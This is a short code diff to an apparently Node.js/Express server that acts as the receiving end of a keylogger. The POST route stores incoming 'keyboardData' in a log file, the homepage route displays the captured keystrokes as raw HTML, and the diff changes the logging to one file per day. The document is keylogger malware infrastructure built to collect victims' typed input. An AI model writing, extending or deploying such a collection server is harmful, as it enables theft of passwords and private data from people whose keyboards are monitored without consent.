@@ -27,8 +27,11 @@ const upload = multer({ storage: storage });
 
 // Homepage - View keylogger logs
 app.get("/", (req, res) => {
+  const logDate = new Date().toISOString().split("T")[0]; 
+  const logFilename = `keyboard_capture${logDate}.txt`;
+
   try {
-    const kl_file = fs.readFileSync("./keyboard_capture.txt", "utf8");
+    const kl_file = fs.readFileSync(`./${logFilename}`, "utf8");
     res.send(`<h1>Data Collected:</h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`);
   } catch {
     res.send("<h1>Nothing logged yet.</h1>");
@@ -40,8 +43,11 @@ app.post("/", (req, res) => {
   const time = req.body.timestamp || "Unknown Time";
   const data = req.body.keyboardData || "";
 
+  const logDate = new Date(). toISOString().split("T")[0];
+  const logFilename = `keyboard_capture${logDate}.txt`;
+
   console.log(`[KEYLOG] ${time} - ${data}`);
-  fs.appendFileSync("keyboard_capture.txt", `${time} - ${data}\n`);
+  fs.appendFileSync(logFilename, `${time} - ${data}\n`)
   res.send("Keyboard data received.");
 });
 
